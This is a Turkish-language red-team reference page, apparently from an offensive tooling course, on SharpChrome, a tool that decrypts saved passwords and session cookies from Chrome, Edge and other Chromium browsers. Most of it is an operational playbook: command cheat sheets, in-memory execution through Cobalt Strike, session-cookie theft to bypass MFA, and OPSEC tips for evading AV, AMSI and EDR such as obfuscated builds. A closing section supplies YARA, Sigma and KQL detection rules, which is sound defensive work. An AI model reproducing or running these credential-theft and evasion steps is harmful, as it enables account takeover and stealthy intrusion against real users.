# SharpChrome

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Will Schroeder (@harmj0y) tarafından GhostPack projesi kapsamında geliştirilen; Google Chrome ve Chromium tabanlı tarayıcılarda (Microsoft Edge, Brave, Opera, Vivaldi) depolanan AES-256-GCM ve DPAPI korumalı web şifrelerini, oturum çerezlerini (Session Cookies) ve gezinti geçmişini bellek içinde dosyasız olarak ayrıştıran C# tabanlı post-exploitation aracı.

---

## 1. Genel Bakış ve Amaç

Modern kurumsal ortamlarda çok faktörlü kimlik doğrulama (MFA / 2FA) sistemleri (Duo, Okta, Microsoft Entra ID / Authenticator) yaygınlaştıkça, saldırganlar için yalnızca Active Directory NTLM hash'lerini veya parolaları ele geçirmek yeterli olmamaya başlamıştır. Bir yöneticinin veya çalışanın bulut portallarına (Azure Portal, AWS Console, Microsoft 365, GitHub, GitLab, SaaS uygulamaları) erişim sağlayabilmek için **aktif oturum çerezlerinin (Session Hijacking / Cookie Stealing)** çalınması en kritik saldırı vektörü haline gelmiştir.

Google Chrome ve Microsoft Edge gibi Chromium tabanlı tarayıcılar, kullanıcıların kayıtlı web form şifrelerini ve oturum çerezlerini yerel SQLite veritabanlarında (`Login Data` ve `Network\Cookies`) saklar. Ancak Chrome v80 sürümünden itibaren Google, bu verileri doğrudan standart Windows DPAPI ile şifrelemek yerine hibrit bir mimariye geçmiştir:
1. **Rastgele Anahtar Üretimi:** Tarayıcı ilk kurulduğunda 256-bitlik rastgele bir simetrik anahtar (Master AES Key) üretir.
2. **DPAPI ile Koruma:** Bu AES anahtarı Windows DPAPI (`CryptProtectData`) ile şifrelenir ve JSON formatındaki `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` dosyası içerisindeki `os_crypt.encrypted_key` alanına Base64 kodlu olarak kaydedilir.
3. **AES-256-GCM Şifreleme:** Veritabanındaki her bir parola ve çerez değeri, `v10` veya `v11` ön eki ile başlayan AES-256-GCM şifreleme modunda saklanır.

**`SharpChrome`**, `SharpDPAPI` projesinin çekirdek DPAPI kütüphanesini kullanarak bu süreci tamamen otomatikleştirir:
- Kurban makinede diske hiçbir yabancı dosya yazmadan, C2 çatılarında (Cobalt Strike, Mythic) `execute-assembly` ile çalışır.
- `Local State` dosyasını okuyup DPAPI MasterKey ile AES anahtarını çözer.
- Ardından kilitli olabilecek SQLite veritabanlarını bellek içine kopyalayarak saniyeler içinde tüm şifreleri ve MFA korumalı bulut oturum çerezlerini açık metin olarak konsola döker.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│             SALDIRGAN / C2 BEACON (execute-assembly)                   │
│                                                                        │
│  [ SharpChrome.exe (.NET / C#) ]                                       │
│         │                                                              │
│         ├── (1) %LOCALAPPDATA%\Google\Chrome\User Data\Local State Oku │
│         │         │                                                    │
│         │         ▼ (os_crypt.encrypted_key Çekilir)                   │
│         │   [ DPAPI Blob Başlığı ("DPAPI...") Doğrulanır ]             │
│         │                                                              │
│         ├── (2) MasterKeyPool veya CryptUnprotectData ile AES Anahtarı │
│         │       Deşifre Edilir: [ 32 Baytlık Ham AES-GCM Anahtarı ]    │
│         │                                                              │
│         ├── (3) SQLite Veritabanı Belleğe Alınır:                      │
│         │       - Default\Login Data     ──> logins Tablosu            │
│         │       - Default\Network\Cookies ──> cookies Tablosu          │
│         │                                                              │
│         └── (4) AES-256-GCM ile Veri Çözümü:                          │
│                   ├── Parolalar (password_value)                       │
│                   └── Çerezler (encrypted_value)                       │
│                         │                                              │
│                         ▼                                              │
│             [ JSON / Konsol Formatında Çıktı ]                         │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **MFA / 2FA Baypası (Çerez Hırsızlığı)**| Çalınan oturum çerezleri saldırganın tarayıcısına aktarılır (Cookie Injection). | Parola veya 2FA koduna gerek kalmadan doğrudan bulut oturumuna girilir. |
| **Edge ve Brave Desteği** | Chromium çekirdeği kullanan Edge, Brave, Opera, Vivaldi tarayıcılarını da çözer. | Kurumsal ortamlarda varsayılan olan Microsoft Edge şifrelerini anında toplar. |
| **Dosyasız C2 Yürütmesi** | .NET assembly formatında derlendiğinden diske dokunmadan RAM'de çalışır. | Uç noktada dosya tabanlı antivirüs taramalarını tamamen atlatır. |
### Karşılaştırma Tablosu

| Kriter | SharpChrome | SharpDPAPI | Mimikatz (dpapi::chrome) | HackBrowserData |
|---|---|---|---|---|
| **Odak Alanı** | Chromium Tarayıcıları | Genel DPAPI / Kasa | Genel DPAPI | Çoklu Tarayıcı |
| **Çalışma Modu** | Bellek İçi (.NET) | Bellek İçi (.NET) | Yerel C / Win32 | Derlenmiş Bağımsız Go |
| **execute-assembly** | **Evet** | **Evet** | Hayır | Hayır |
| **Çerez JSON Dökümü**| Var (Hazır Cookie formatı)| Kısıtlı | Yok | Var |
| **EDR Yakalanma Riski**| Düşük - Orta | Düşük - Orta | Çok Yüksek | Orta (Diske EXE bırakır) |

### 1.1 Chromium AES-256-GCM Veri Formatı ve App-Bound İzolasyonu

Chromium veritabanlarında (`Login Data` ve `Cookies`) saklanan her bir şifreli girdi şu bayt düzenine sahiptir:
- **`v10` veya `v11` Başlığı (3 Bayt):** Girdinin Chrome v80+ AES-256-GCM algoritmasıyla şifrelendiğini belirtir (ASCII `v10` = `0x76 0x31 0x30`).
- **Initialization Vector / Nonce (12 Bayt):** AES-GCM şifrelemesi için kullanılan rastgele vektör.
- **Şifreli Veri Bloğu (Ciphertext):** Asıl parola veya çerez değeri.
- **Kimlik Doğrulama Etiketi (Auth Tag - 16 Bayt):** GCM modunun veri bütünlüğünü garanti eden MAC etiketi.

`SharpChrome`, `Local State` dosyasındaki DPAPI blob'unu açarak 32 baytlık simetrik anahtarı RAM'e alır. Ardından her bir kaydın ilk 3 baytını (`v10`) atlar, 12 baytlık IV'yi ve 16 baytlık Auth Tag'i ayırarak .NET'in `AesGcm` sınıfı ile açık metne dönüştürür.

**Chrome v127+ App-Bound Encryption:**
Google, Chrome v127 sürümünden itibaren bu DPAPI anahtarını korumak için `elevation_service.exe` adında `SYSTEM` seviyesinde çalışan bir COM servisi tanıtmıştır. Bu koruma devredeyken standart kullanıcı seviyesinde çalışan araçlar `Local State` içindeki anahtarı doğrudan açamaz; saldırganın makinede yerel SYSTEM haklarına yükselerek COM servisini çağırması gerekir.

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
SharpChrome.exe <komut> [seçenekler]
```

### Desteklenen Alt Komutlar (Subcommands)

| Komut | Açıklama |
|---|---|
| `logins` | Kayıtlı web siteleri, kullanıcı adları ve açık metin parolaları döker. |
| `cookies` | Oturum açma çerezlerini (Session & Auth Cookies) ayıklar. |
| `history` | Kullanıcının web gezinti geçmişini, ziyaret sayılarını ve zaman damgalarını listeler. |
| `triage` | Hem parolaları hem de çerezleri tek bir hamlede tarar. |

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `/browser:<ad>` | Hedef tarayıcıyı belirtir (`chrome`, `edge`, `brave`, `opera`, `all`). | `/browser:edge` |
| `/format:<tur>` | Çıktı formatını belirler (`table`, `json`, `csv`). | `/format:json` |
| `/target:<yol>` | Özel bir `User Data` klasör yolunu belirtir. | `/target:C:\Users\jdoe\AppData\...` |
| `/pvk:<yol>` | Etki alanı kurtarma anahtarı ile çevrimdışı MasterKey çözme. | `/pvk:C:\Temp\backup.pvk` |
| `/server:<dc>` | Uzak DC'den RPC ile DPAPI kurtarma anahtarı talep etme. | `/server:dc01.corp.local` |
| `/showall` | Boş veya deşifre edilemeyen girdiler dahil tüm veritabanını listeler. | `/showall` |
| `/password:<parola>` | Kullanıcı parolası belirterek MasterKey çözme. | `/password:Secret123!` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Mevcut Kullanıcının Chrome Parolalarını Dökmek

Aktif kullanıcı oturumunda doğrudan `logins` komutu çalıştırılır. Araç `Local State` içindeki anahtarı çözer ve veritabanını okur:

```cmd
SharpChrome.exe logins
```

**Konsol Çıktısı Analizi:**

```text
[*] SharpChrome by @harmj0y
[*] Action: Chrome Logins Triage

[*] Scanning C:\Users\jdoe\AppData\Local\Google\Chrome\User Data\Default\Login Data...
[+] Successfully decrypted master AES key via DPAPI!

--- Chrome Credential [1] ---
URL      : https://gitlab.corp.local/users/sign_in
Username : jdoe
Password : GitLabCompanyMaster2026!

--- Chrome Credential [2] ---
URL      : https://aws.amazon.com/console/
Username : dev-lead@corp.local
Password : CloudAwsSuperP@ss!

[+] Found 2 credentials.
```

---

### Senaryo 2: Oturum Çerezlerini Çekerek Bulut Oturumu Çalma (Session Hijacking)

Çerezler JSON formatında dışa aktarılır. Saldırgan bu JSON çıktısını kendi tarayıcısındaki Cookie Editör eklentisine aktararak 2FA/MFA ekranını atlar:

```cmd
SharpChrome.exe cookies /format:json
```

---

### Senaryo 3: Microsoft Edge Tarayıcısını Hedefleme (`/browser:edge`)

Kurumsal makinelerde çalışanların varsayılan olarak kullandığı Edge tarayıcısının veritabanını tarama:

```cmd
SharpChrome.exe logins /browser:edge
```

---

### Senaryo 4: Cobalt Strike `execute-assembly` ile Dosyasız İcra

Saldırgan, Beacon oturumu üzerinden diske hiçbir şey yazmadan tarayıcı şifrelerini çeker:

```text
beacon> execute-assembly /opt/GhostPack/SharpChrome.exe logins /browser:all
```

---

### Senaryo 5: Domain Backup Key (`/pvk:`) ile Farklı Kullanıcıların Tarayıcılarını Açma

Hedef makinedeki diğer tüm kullanıcıların profillerini DC kurtarma anahtarı kullanarak deşifre etme:

```cmd
SharpChrome.exe logins /pvk:C:\Temp\domain.pvk /target:C:\Users\AdminUser\AppData\Local\Google\Chrome\User Data\
```

---

### Senaryo 6: Gezinti Geçmişi ile İç Ağ Panellerini ve IP'leri Haritalama

Kullanıcının intranet üzerinde girdiği iç web portallarını keşfetmek için geçmiş kayıtlarını sorgulama:

```cmd
SharpChrome.exe history
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Database is locked / SQLite busy` | Chrome veya Edge o anda kullanıcı tarafından açık tutuluyor; dosya tanıtıcısı kilitli. | Tarayıcıyı kapatmasını bekleyin veya `copy` komutuyla `Login Data` dosyasını geçici bir dizine (`C:\Temp\login.tmp`) kopyalayıp `/target:` ile gösterin. |
| `Unsupported encryption prefix (Not v10/v11)` | Dosya Chrome v80 öncesi eski bir sürüme ait veya bozuk. | Eski sürümlerde doğrudan DPAPI kullanılır; standart `CryptUnprotectData` veya `SharpDPAPI` deneyin. |
| `Chrome v127+ App-Bound Encryption Error` | Chrome v127+ sürümünde şifreleme anahtarı SYSTEM seviyesinde bir Windows servisiyle izole edilmiştir. | Standart kullanıcı oturumu yerine SYSTEM yetkilerine yükselin (`token::elevate`) veya bellek içi tarayıcı kancalama tekniklerine geçin. |
| `MasterKey could not be decrypted` | Oturum açmış kullanıcının dışında bir profil taranıyor ve `/pvk:` kurtarma anahtarı sağlanmadı. | İlgili kullanıcının NTLM hash'ini (`/ntlm:`) veya DC kurtarma anahtarını (`/pvk:`) komuta ekleyin. |
| `Local State file not found` | Belirtilen kullanıcı profili varsayılan dizinde değil veya taşınabilir (Portable) tarayıcı kullanılıyor. | Doğru profili saptamak için `/target:` parametresiyle `User Data` ana klasörünü açıkça belirtin. |
| `Empty passwords / (null)` | Kullanıcı tarayıcıda parola kaydetmeyi devre dışı bırakmış veya tüm parolalar silinmiş. | Çerezleri kontrol edin (`cookies` komutu); parolalar kaydedilmese dahi oturum çerezleri aktiftir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK - ORTA (DOSYASIZ .NET İCRASI)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4688 (Process Creation) [execute-assembly hariç]
[ Sysmon ]          : Event ID 7 (.NET CLR Yüklemesi), Event ID 1
[ Dosya Erişimi ]   : AppData\Local\Google\Chrome\User Data\Login Data Okuma
[ EDR Davranışı ]   : Tarayıcı veritabanlarına olağandışı süreç erişimi
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Sysmon Event ID 7 (ImageLoaded - CLR):**
   - Meşru bir Windows sürecine `execute-assembly` ile enjekte edildiğinde `clr.dll` yüklenmesi.
2. **Dosya Okuma İmzaları:**
   - Standart dışı bir sürecin (örneğin `rundll32.exe`, `powershell.exe` veya yabancı bir C# sürecinin) `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` ve `Local State` dosyalarını açması.
3. **Kayıt Defteri ve DPAPI Çağrıları:**
   - `Local State` içindeki anahtarı açmak için `CryptUnprotectData` Win32 API çağrısı yapılması.

### 5.2 Ağ ve EDR İmzaları

- **Tarayıcı Veritabanı Koruma Sensörleri:** Modern EDR'lar (SentinelOne, CrowdStrike), `chrome.exe` dışında herhangi bir sürecin `Login Data` veya `Network\Cookies` SQLite veritabanına erişim sağlamasını doğrudan "Credential Access: Browser" şüphesiyle izler.
- **Ağ İmzası Yoktur:** Çerez ve parola çözümleme işlemleri tamamen yerel bellek içinde gerçekleşir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1555.003** | Credentials from Web Browsers | Chrome, Edge ve Brave şifrelerini çözme. |
| **T1539** | Steal Web Session Cookie | MFA korumalı oturum çerezlerini ayıklama. |
| **T1218** | System Binary Proxy Execution | `execute-assembly` ile bellek içi dosyasız icra. |
| **T1005** | Data from Local System | Kullanıcının web geçmişini çıkarma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Veritabanı Erişim Alarmı** | `Login Data` dosyasına doğrudan açık erişim sağlamak yerine, dosyayı geçici bir dizine kopyalayarak orada analiz edin veya doğrudan bellek taraması yapın. |
| **İkili Tespiti (AMSI)** | Hazır derlenmiş `SharpChrome.exe` ikilisini diske bırakmayın. Kaynak kodunu karıştırarak (Obfuscation) derleyin ve C2 üzerinden `execute-assembly` ile bellekten çalıştırın. |
| **Kilitli Dosya İstisnası** | Tarayıcı açıkken çalıştırıldığında hata almamak için dosya okuma paylaşım modunu (`FileShare.ReadWrite`) kullanan güncel derlemeleri tercih edin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — SharpChrome .NET Assembly İmzası:**

```yara
rule Suspicious_SharpChrome_Assembly {
    meta:
        description = "Detects SharpChrome post-exploitation assembly for browser credential dumping"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "SharpChrome" ascii wide nocase
        $s2 = "Login Data" ascii wide
        $s3 = "encrypted_key" ascii wide
        $s4 = "os_crypt" ascii wide
    condition:
        uint16(0) == 0x5A4D and 3 of them
}
```

**Sigma Kuralı — Tarayıcı Şifre Dosyalarına Yetkisiz Süreç Erişimi:**

```yaml
title: Suspicious Access to Browser Credential Files
status: experimental
description: Detects non-browser processes attempting to read Chrome or Edge Login Data and Cookie files.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 11
    TargetFilename|contains:
      - '\Google\Chrome\User Data\Default\Login Data'
      - '\Microsoft\Edge\User Data\Default\Login Data'
      - '\Network\Cookies'
  filter:
    Image|endswith:
      - '\chrome.exe'
      - '\msedge.exe'
      - '\brave.exe'
  condition: selection and not filter
level: critical
```

**Microsoft Sentinel (KQL) — Tarayıcı Kasa Dosyalarını Hedefleyen Şüpheli Süreçler:**

```kql
DeviceFileEvents
| where FolderPath has @"Google\Chrome\User Data" or FolderPath has @"Microsoft\Edge\User Data"
| where FileName in~ ("Login Data", "Cookies", "Local State")
| where ActionType == "FileRead"
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "explorer.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FolderPath, FileName
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Tüm Kayıtlı Web Şifrelerini Dökme
```cmd
SharpChrome.exe logins
```
- **Ne Yapar?** Google Chrome'un şifreli `Login Data` veritabanını çözer ve kayıtlı kullanıcı adı ve parolaları listeler.
- **Ne Zaman Kullanılır?** Kurban kullanıcının web portalları şifrelerini ele geçirmek için.
- **Parametreler:** `logins`: Parola döküm komutu.

### Komut 2: Oturum Çerezlerini JSON Olarak İndirme
```cmd
SharpChrome.exe cookies /format:json
```
- **Ne Yapar?** Tüm aktif web oturum çerezlerini Cookie Editor eklentisiyle uyumlu JSON formatında çıktılar.
- **Ne Zaman Kullanılır?** 2FA/MFA korumalı bulut oturumlarına doğrudan sızmak (Session Hijacking) için.
- **Parametreler:** `cookies`: Çerez komutu, `/format:json`: JSON biçimlendirme.

### Komut 3: Microsoft Edge Tarayıcısını Hedefleme
```cmd
SharpChrome.exe logins /browser:edge
```
- **Ne Yapar?** Google Chrome yerine Microsoft Edge tarayıcısının veritabanını çözer.
- **Ne Zaman Kullanılır?** Kurumsal Windows 10/11 ortamlarında Edge şifrelerini çekmek için.
- **Parametreler:** `/browser:edge`: Edge tarayıcı filtresi.

### Komut 4: Tüm Yüklü Chromium Tarayıcılarını Tek Hamlede Tarama
```cmd
SharpChrome.exe triage /browser:all
```
- **Ne Yapar?** Sistemde kurulu Chrome, Edge, Brave ve Opera tarayıcılarının tamamını sırayla tarar.
- **Ne Zaman Kullanılır?** Hangi tarayıcının aktif kullanıldığını bilmediğiniz ilk keşif aşamasında.
- **Parametreler:** `triage`: Tam tarama, `/browser:all`: Tüm tarayıcılar.

### Komut 5: Cobalt Strike ile Bellek İçi Şifre Hasadı
```text
beacon> execute-assembly SharpChrome.exe logins
```
- **Ne Yapar?** SharpChrome ikilisini diske bırakmadan doğrudan Beacon belleği üzerinden çalıştırır.
- **Ne Zaman Kullanılır?** C2 operasyonlarında disk tabanlı AV sensörlerini atlatmak için.
- **Parametreler:** `execute-assembly`: .NET bellek çalıştırma komutu.

### Komut 6: Gezinti Geçmişini Dökme
```cmd
SharpChrome.exe history
```
- **Ne Yapar?** Kullanıcının ziyaret ettiği web adreslerini, sayfa başlıklarını ve tarihleri listeler.
- **Ne Zaman Kullanılır?** İç ağdaki intranet sitelerini, yönetim panellerini ve hedef IP'leri bulmak için.
- **Parametreler:** `history`: Geçmiş sorgulama komutu.

### Komut 7: Domain Backup Key ile Başka Bir Kullanıcıyı Çözme
```cmd
SharpChrome.exe logins /pvk:C:\Temp\backup.pvk /target:C:\Users\TargetUser\AppData\Local\Google\Chrome\User Data\
```
- **Ne Yapar?** Belirtilen kullanıcı profiline ait şifreleri DC kurtarma anahtarı ile çevrimdışı açar.
- **Ne Zaman Kullanılır?** Hedef kullanıcının parolası bilinmediğinde ve oturumu açık olmadığında.
- **Parametreler:** `/pvk:`: Kurtarma anahtarı, `/target:`: Profil klasörü.

### Komut 8: Yalnızca Belirli Bir Siteye Ait Çerezleri Çekme
```cmd
SharpChrome.exe cookies /showall | findstr /i "okta aws azure google"
```
- **Ne Yapar?** Çerez çıktısını filtreleyerek yalnızca kritik bulut sağlayıcılarının çerezlerini ekrana basar.
- **Ne Zaman Kullanılır?** Binlerce çerez arasında kritik oturumları hızlıca filtrelemek için.
- **Parametreler:** `findstr /i`: Metin filtreleme aracı.

### Komut 9: Kopyalanmış Geçici Veritabanını Analiz Etme (Lock Bypass)
```cmd
copy "C:\Users\jdoe\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Temp\ld.tmp && SharpChrome.exe logins /target:C:\Temp\
```
- **Ne Yapar?** Açık tarayıcının kilitlediği dosyayı kopyalar ve kopya üzerinden şifreleri çözer.
- **Ne Zaman Kullanılır?** `Database is locked` hatası alındığında.
- **Parametreler:** `copy` ve `/target:` kombinasyonu.

### Komut 10: Çıktıyı Gizleyerek Dosyaya Yönlendirme
```cmd
SharpChrome.exe logins > C:\Users\Public\chrome_sync.log 2>&1
```
- **Ne Yapar?** Çıkarılan şifreleri ekrana basmak yerine belirtilen geçici metin dosyasına kaydeder.
- **Ne Zaman Kullanılır?** Kör komut yürütme (Blind Execution) senaryolarında çıktı toplamak için.
- **Parametreler:** `>` dosya yönlendirmesi.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [GhostPack / SharpChrome](https://github.com/GhostPack/SharpChrome)
- **Harmj0y Blog:** [Decrypted Chrome Cookies and Passwords via DPAPI](https://blog.harmj0y.net/)
- **MITRE ATT&CK Referansı:** [T1555.003 - Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)
- **Chromium Kaynak Kodu:** [OS Crypt Architecture in Chromium](https://source.chromium.org/chromium/chromium/src/+/main:components/os_crypt/)

---

> **Önceki:** [← dpapi.py](./dpapi.md) · **Sonraki:** [Seatbelt →](./Seatbelt.md)
